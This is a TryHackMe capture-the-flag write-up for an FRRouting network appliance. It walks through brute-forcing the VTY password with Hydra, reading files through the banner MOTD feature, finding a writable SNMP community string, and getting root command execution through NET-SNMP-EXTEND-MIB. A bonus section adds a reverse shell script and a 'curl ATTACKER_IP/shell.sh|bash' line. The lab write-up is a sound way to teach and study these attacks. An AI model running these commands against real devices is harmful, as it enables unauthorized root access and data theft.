# Operation Takeover - TryHackMe Writeup

**Status:** WIP / pending final closure.  
**Target:** `TARGET_IP` (10.128.162.109 at time of solve)  
**OS:** Linux (network appliance - FRRouting)  
**Difficulty:** Medium  
**Tech stack:** OpenSSH, FRRouting 10.0 VTY on port 2623, Net-SNMP

---

## Attack Chain Overview

```text
nmap -> 22, 179 (BGP), 2623 (FRRouting VTY)
  -> nc :2623 -> FRRouting 10.0 password prompt
  -> Hydra cisco brute force -> password: arista
  -> enable -> arista -> privileged mode
  -> banner motd file /etc/frr/frr.conf -> reconnect -> config leak
  -> mgmt load-config /root/flag.txt merge -> banner leak attempt
  -> dead end -> UDP recon
  -> nmap UDP -> 161/udp SNMP open
  -> onesixtyone -> community string: pr1v4t3
  -> snmpset NET-SNMP-EXTEND-MIB -> RCE as root -> flag
```

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [FRRouting VTY Brute Force](#2-frrouting-vty-brute-force)
3. [Privileged Mode Access](#3-privileged-mode-access)
4. [Configuration and Flag Exfiltration Dead End](#4-configuration-and-flag-exfiltration-dead-end)
5. [SNMP Enumeration](#5-snmp-enumeration)
6. [SNMP RCE via NET-SNMP-EXTEND-MIB](#6-snmp-rce-via-net-snmp-extend-mib)
7. [Key Takeaways](#7-key-takeaways)

---

## 1. Reconnaissance

```bash
# What it does: run a full TCP port scan and service version detection.
# Why here: discover the FRRouting VTY service on port 2623.
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET --open -oN silent
nmap -sVC -p22,2623 $TARGET -oN service
nmap -O $TARGET
```

| Port | Service |
|------|---------|
| 22/tcp | OpenSSH |
| 179/tcp | tcpwrapped (BGP) |
| 2623/tcp | lmdp (FRRouting VTY) |

---

## 2. FRRouting VTY Brute Force

```bash
# What it does: connect to the FRRouting VTY line via netcat.
# Why here: identify the service banner and confirm it uses a single Cisco-style password.
nc -v $TARGET 2623
# FRRouting (version 10.0)
# Password:
```

```bash
# What it does: brute-force the Cisco-style single-password authentication with Hydra.
# Why here: recover the VTY password to gain access to the routing console.
hydra -P /usr/share/wordlists/rockyou.txt $TARGET cisco -s 2623 -t 64 -f
# [2623][cisco] host: $TARGET   password: arista
```

Tools: [hydra](../../../tools/creds/hydra.md), [netcat](../../../tools/pivot/netcat.md).

---

## 3. Privileged Mode Access

```bash
# What it does: enter privileged enable mode on the FRRouting console.
# Why here: gain access to configuration commands and file-read primitives.
enable
# Password: arista
```

---

## 4. Configuration and Flag Exfiltration Dead End

FRRouting allows local files to be exposed through `banner motd file`. Pointing the banner at a sensitive file and reconnecting shows the file content as the login MOTD.

```bash
# What it does: set the MOTD banner to the contents of the FRR configuration file.
# Why here: exfiltrate router configuration by abusing the banner-file feature.
configure terminal
banner motd file /etc/frr/frr.conf
```

```bash
# What it does: reconnect to the VTY to view the banner with the leaked config.
# Why here: read the exfiltrated file content displayed as the login banner.
nc -v $TARGET 2623
```

The flag was not recovered through this path, so the next pivot was UDP reconnaissance.

---

## 5. SNMP Enumeration

```bash
# What it does: scan UDP port 161 to check for an exposed SNMP service.
# Why here: TCP recon was exhausted; UDP is the natural next pivot on network appliances.
nmap -sU -p 161 $TARGET
```

```text
PORT    STATE         SERVICE
161/udp open|filtered snmp
```

```bash
# What it does: brute-force SNMP community strings using a common wordlist.
# Why here: SNMPv1/v2c authenticates only via community strings;
#           weak or default strings like "public", "private" and "pr1v4t3" are common.
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET
# Output: $TARGET [pr1v4t3] ...
```

```bash
# What it does: walk the full MIB tree using the discovered community string.
# Why here: enumerate exposed OIDs to understand what information the agent leaks.
snmpwalk -v2c -c pr1v4t3 $TARGET
```

No useful VTY credentials appeared in the SNMP data. The community string `pr1v4t3`, however, looked intentionally close to `private` and hinted at read-write access.

```bash
# What it does: attempt to write a new sysName value via SNMP SET.
# Why here: confirm that the community string grants write access, not just read.
snmpset -v2c -c pr1v4t3 $TARGET .1.3.6.1.2.1.1.5.0 s "Pwned"
snmpget -v2c -c pr1v4t3 $TARGET .1.3.6.1.2.1.1.5.0
# iso.3.6.1.2.1.1.5.0 = STRING: "Pwned"
```

Write access was confirmed. The target was running Net-SNMP with `NET-SNMP-EXTEND-MIB`, which allows arbitrary commands to be registered and executed when the extend output subtree is queried.

---

## 6. SNMP RCE via NET-SNMP-EXTEND-MIB

Full technique: [snmp-extend-mib-rce.md](../../../exploits/network-services/snmp-extend-mib-rce.md).

> **Kali prerequisite:** symbolic MIBs are not installed by default. Without them, `snmpset` fails with `Unknown Object Identifier`.
>
> ```bash
> sudo apt install snmp-mibs-downloader -y && sudo download-mibs
> sudo sed -i 's/^mibs :/# mibs :/' /etc/snmp/snmp.conf
> ```

```bash
# What it does: register a new SNMP extend entry that executes /bin/bash -c "ls /root".
# Why here: NET-SNMP-EXTEND-MIB lets us define named shell commands that the agent
#           runs on demand; createAndGo activates the entry immediately.
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c pr1v4t3 $TARGET \
    'nsExtendStatus."command"'  = createAndGo \
    'nsExtendCommand."command"' = /bin/bash \
    'nsExtendArgs."command"'    = '-c "ls /root"'
```

```bash
# What it does: walk the NET-SNMP extend output subtree to trigger and read command output.
# Why here: querying .1.3.6.1.4.1.8072.1.3.2 forces the agent to evaluate
#           all registered extend entries and return their stdout.
#
#   1.3.6.1.4.1       -> private enterprise space (IANA)
#   8072              -> NET-SNMP enterprise ID
#   1.3.6.1.4.1.8072.1.3 -> NET-SNMP extend mechanism
#   ...2              -> extend output table
snmpwalk -v2c -c pr1v4t3 $TARGET .1.3.6.1.4.1.8072.1.3.2
# -> flag.txt visible in /root
```

```bash
# What it does: update the extend entry to cat the flag.
# Why here: re-issuing createAndGo with the same entry name overwrites the arguments.
#           May need to run twice if the entry is cached.
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c pr1v4t3 $TARGET \
    'nsExtendStatus."command"'  = createAndGo \
    'nsExtendCommand."command"' = /bin/bash \
    'nsExtendArgs."command"'    = '-c "cat /root/flag.txt"'

snmpwalk -v2c -c pr1v4t3 $TARGET .1.3.6.1.4.1.8072.1.3.2
# -> FLAG{...}
```

### Bonus: Reverse Shell

The `nsExtendArgs` field has a character limit. The practical workaround is to host a payload on an HTTP server and fetch it with `curl`.

```bash
# What it does: create and serve the reverse shell script via Python HTTP server.
# Why here: avoids the character limit in nsExtendArgs.
cat > shell.sh << 'EOF'
#!/bin/bash
/bin/bash -i >& /dev/tcp/ATTACKER_IP/4445 0>&1
EOF
python3 -m http.server 80
```

```bash
# Listener
nc -lnvp 4445
```

```bash
# What it does: fetch and execute the reverse shell via the SNMP extend entry.
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c pr1v4t3 $TARGET \
    'nsExtendStatus."command"'  = createAndGo \
    'nsExtendCommand."command"' = /bin/bash \
    'nsExtendArgs."command"'    = '-c "curl ATTACKER_IP/shell.sh|bash"'

snmpwalk -v2c -c pr1v4t3 $TARGET .1.3.6.1.4.1.8072.1.3.2
```

---

## 7. Key Takeaways

| Lesson | Detail |
|--------|--------|
| Write community strings can become RCE | `pr1v4t3` with write access plus Net-SNMP allowed command execution as root |
| `NET-SNMP-EXTEND-MIB` is dangerous | Any Net-SNMP agent with writable SNMP and this module enabled is a command-execution target |
| UDP recon is mandatory | The final vector lived on UDP/161 and was invisible to TCP-only scanning |
| Kali MIBs are not installed by default | `snmp-mibs-downloader` is required for symbolic MIB names |
| Long args need staging | For long payloads, fetch a script with `curl` instead of trying to inline the full reverse shell |

---

## Related Notes

- [hydra](../../../tools/creds/hydra.md) - VTY brute force
- [netcat](../../../tools/pivot/netcat.md) - VTY console connection
- [nmap](../../../tools/recon/nmap.md) - Initial port discovery
- [onesixtyone](../../../tools/recon/onesixtyone.md) - SNMP community string brute-forcer
- [snmpwalk](../../../tools/recon/snmpwalk.md) - SNMP MIB tree enumeration
- [snmpset](../../../tools/recon/snmpset.md) - SNMP value writes
- [frrouting-vty-banner-file-read](../../../exploits/network-services/frrouting-vty-banner-file-read.md) - FRRouting banner MOTD local file read
- [snmp-extend-mib-rce](../../../exploits/network-services/snmp-extend-mib-rce.md) - SNMP NET-SNMP-EXTEND-MIB command execution
